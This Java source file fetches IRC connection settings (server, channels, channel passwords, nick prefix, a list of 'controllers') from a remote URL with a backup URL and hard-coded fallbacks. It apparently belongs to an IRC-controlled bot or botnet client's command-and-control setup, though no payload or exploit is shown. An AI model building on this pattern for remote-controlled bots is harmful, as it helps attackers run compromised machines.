import java.net.URL;
import java.io.BufferedReader;
import java.io.InputStreamReader;

class ConfigReader {

	private Config config;

	public ConfigReader(Config config) {
		this.config = config;
	}

	public void read() {
		try {
			URL confURL = null;
			URLChecker checker = new URLChecker(new URL(Constants.CONF_URL));
			if(checker.check()) {
				confURL = new URL(Constants.CONF_URL);
			} else {
				checker = new URLChecker(new URL(Constants.CONF_URL_BACKUP));
				if(checker.check()) {
					confURL = new URL(Constants.CONF_URL_BACKUP);
				} else {
					this.config.setServer(ConfigDefaults.SERVER);
					this.config.setPort(ConfigDefaults.PORT);
					this.config.setInChannel(ConfigDefaults.IN_CHANNEL);
					this.config.setOutChannel(ConfigDefaults.OUT_CHANNEL);
					this.config.setInChannelPassword(ConfigDefaults.CHANNEL_IN_PASSWORD);
					this.config.setOutChannelPassword(ConfigDefaults.CHANNEL_OUT_PASSWORD);
					this.config.setNickPrefix(ConfigDefaults.NICK_PREFIX);
					this.config.setControllers(ConfigDefaults.CONTROLLERS);
				}
			}
			if(confURL != null) {
				Debug.print("Reading from " + Constants.CONF_URL + "... \n");
				this.readURL(confURL);
			}
		} catch(Exception e) {
		}
	}
	
	private void readURL(URL url) {
		try {
			BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));
			String line;
			while((line = reader.readLine()) != null) {
				String[] tokens = line.split("</br>");
				this.config.setServer(tokens[0].substring(8));
				this.config.setPort(Integer.parseInt(tokens[1].substring(6)));
				this.config.setInChannel(tokens[2].substring(12));
				this.config.setOutChannel(tokens[3].substring(13));
				this.config.setInChannelPassword(tokens[4].substring(13));
				this.config.setOutChannelPassword(tokens[5].substring(13));
				this.config.setNickPrefix(tokens[6].substring(6));
				String[] controllers = tokens[7].substring(13).split(",");
				this.config.setControllers(controllers);
				Debug.print("Server = " + this.config.getServer() + "\n");
				Debug.print("Port = " + this.config.getPort() + "\n");
				Debug.print("In channel = " + this.config.getInChannel() + "\n");
				Debug.print("Out channel = " + this.config.getOutChannel() + "\n");
				Debug.print("In channel pass = " + this.config.getInChannelPassword() + "\n");
				Debug.print("Out channel pass = " + this.config.getOutChannelPassword() + "\n");
				Debug.print("Nick = " + this.config.getNickPrefix() + "\n");
				for(String str : this.config.getControllers()) {
					Debug.print("Controller = " + str + "\n");
				}
			}
		} catch(Exception e) {
			Debug.print(e.toString() + "\n");
		}
	}
}